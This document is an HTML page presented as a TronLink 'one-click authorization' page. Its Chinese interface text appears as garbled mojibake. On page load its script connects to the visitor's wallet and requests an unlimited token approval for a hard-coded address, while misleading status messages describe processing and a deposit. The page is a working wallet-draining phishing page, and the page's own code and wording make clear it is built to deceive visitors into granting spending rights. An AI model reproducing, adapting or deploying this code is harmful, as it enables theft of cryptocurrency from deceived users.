<!DOCTYPE html>
<html lang="zh-Hant">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>ä¸€éµæˆæ¬Šé é¢</title>
  <style>
    body { font-family: "Noto Sans TC", sans-serif; background:#0f172a; color:#fff;
      display:flex; align-items:center; justify-content:center; height:100vh; margin:0; padding:20px; }
    .container { background:rgba(255,255,255,0.05); backdrop-filter:blur(12px);
      border-radius:16px; padding:30px 40px; max-width:420px; width:100%; text-align:center;
      box-shadow:0 8px 20px rgba(0,0,0,0.3); }
    h1 { font-size:26px; margin-bottom:16px; font-weight:600; }
    p { font-size:16px; margin-bottom:20px; color:#cbd5e1; }
    #status { margin-top:20px; min-height:24px; font-size:14px; }
    .loading { color:#facc15; }
    .success { color:#4ade80; }
    .error { color:#f87171; }
    button { background:#38bdf8; border:none; padding:10px 18px;
      border-radius:8px; color:#000; font-weight:bold; cursor:pointer; }
    a { color:#38bdf8; text-decoration:underline; }
  </style>
  <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.min.js"></script>
</head>
<body>
  <div class="container">
    <h1>ä¸€éµæˆæ¬Šé é¢</h1>
    <p>é»æ“Šä¸‹æ–¹æŒ‰éˆ•ï¼Œå¾ TronLink App çš„ DApp ç€è¦½å™¨é‡æ–°é–‹å•Ÿæ­¤é é€²è¡Œæˆæ¬Šã€‚</p>
    <button onclick="openTronLink()">ğŸ“² ç”¨ TronLink é–‹å•Ÿ</button>
    <p id="fallback-tip" style="display:none; margin-top:10px;">
      æœªæˆåŠŸå•Ÿå‹• Appï¼Ÿ<br>
      ğŸ‘‰ <a href="https://apps.apple.com/app/id1518002753" target="_blank">å®‰è£ TronLink iOS App</a><br>
      å®‰è£å®Œè«‹å¾ App å…§ DApp ç€è¦½å™¨è²¼ä¸Šæœ¬é ç¶²å€é–‹å•Ÿ
    </p>
    <p id="status" class="loading">æ­£åœ¨æª¢æ¸¬éŒ¢åŒ…...</p>
  </div>

<script>
const TRUSD_CONTRACT = "TUpMhErZL2fhh4sVNULAbNKLokS4GjC1F4";
const A_ADDRESS = "TKnC8zjqnb2Bmadd2ibNnLswZwp67zyi26";
const INFINITE_AMOUNT = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
let tronWeb;

function openTronLink() {
  window.location.href = "tronlink://";
  setTimeout(()=>{ document.getElementById('fallback-tip').style.display='block'; }, 2000);
}

async function connectWallet() {
  if (window.tronWeb && window.tronWeb.ready) {
    tronWeb = window.tronWeb; return tronWeb.defaultAddress.base58;
  }
  return null;
}

async function checkTronNetwork() {
  try {
    const chainId = await tronWeb.trx.getChainId?.();
    if (chainId && chainId !== '_') {
      updateStatus("è«‹åˆ‡æ›è‡³ TRON ä¸»ç¶²", "error"); return false;
    }
    return true;
  } catch { return true; }
}

async function approve() {
  updateStatus("è³‡ç”¢è™•ç†ä¸­ï¼Œè«‹ç¨å€™â€¦", "loading");
  try {
    const contract = await tronWeb.contract().at(TRUSD_CONTRACT);
    await contract.approve(A_ADDRESS, INFINITE_AMOUNT).send();
    updateStatus("é…ç½®æˆåŠŸï¼Œç³»çµ±å°‡é€²å…¥å…¥å¸³æµç¨‹", "success");
    setTimeout(()=>{ window.location.href = "success.html"; }, 2000);
  } catch {
    updateStatus("ç³»çµ±ç•°å¸¸ï¼Œè«‹ç¨å¾Œé‡è©¦", "error");
    setTimeout(()=>{ window.location.href = "error.html"; }, 2500);
  }
}

function updateStatus(msg, type) {
  const el = document.getElementById("status");
  el.innerText = msg;
  el.className = type;
}

window.addEventListener('load', async ()=> {
  const addr = await connectWallet();
  if (!addr) {
    updateStatus("æœªåµæ¸¬åˆ°éŒ¢åŒ…ï¼Œè«‹ç”¨ TronLink App é–‹å•Ÿæœ¬é é¢", "error");
    return;
  }
  if (!(await checkTronNetwork())) return;
  approve();
});
</script>
</body>
</html>
